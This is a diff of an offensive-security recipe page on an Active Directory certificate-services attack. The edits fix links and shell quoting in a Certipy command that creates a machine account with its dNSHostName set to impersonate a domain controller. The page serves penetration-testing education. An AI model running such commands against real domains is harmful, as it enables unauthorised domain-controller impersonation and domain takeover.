@@ -55,7 +55,7 @@ _At the time of writing this recipe, June 2022, no Windows alternative has been 
 
 #### Creating a computer account
 
-The first step of the attack consists in creating a computer account ([broken-reference](../../../ad/movement/ad-cs/broken-reference/ "mention"), [broken-reference](../../../ad/movement/ad-cs/broken-reference/ "mention")), or have the write permission to the `dNSHostName` and `servicePrincipalName` attributes of another.
+The first step of the attack consists in creating a computer account ([broken-reference](broken-reference/ "mention"), [broken-reference](broken-reference/ "mention")), or have the write permission to the `dNSHostName` and `servicePrincipalName` attributes of another.
 
 #### `dNSHostName` and `servicePrincipalName` modification
 
@@ -80,8 +80,8 @@ bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAM
 
 [Certipy](https://github.com/ly4k/Certipy) tool can also add a machine account and amend the `dNSHostName` property with the following command liner.
 
-<pre class="language-bash"><code class="lang-bash"><strong># Adding a computer account and setting the dNSHostName to impersonate
-</strong>certipy account create -u '$USER@DOMAIN' -p '$PASSWORD' -user '$COMPUTER_NAME' -pass '$COMPUTER_PASS' -dns '$DC_NAME.$DOMAIN'
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># Adding a computer account and setting the dNSHostName to impersonate
+</strong>certipy account create -u "$USER"@"$DOMAIN" -p "$PASSWORD" -user "$COMPUTER_NAME" -pass "$COMPUTER_PASS" -dns "$DC_NAME.$DOMAIN"
 </code></pre>
 
 {% hint style="info" %}
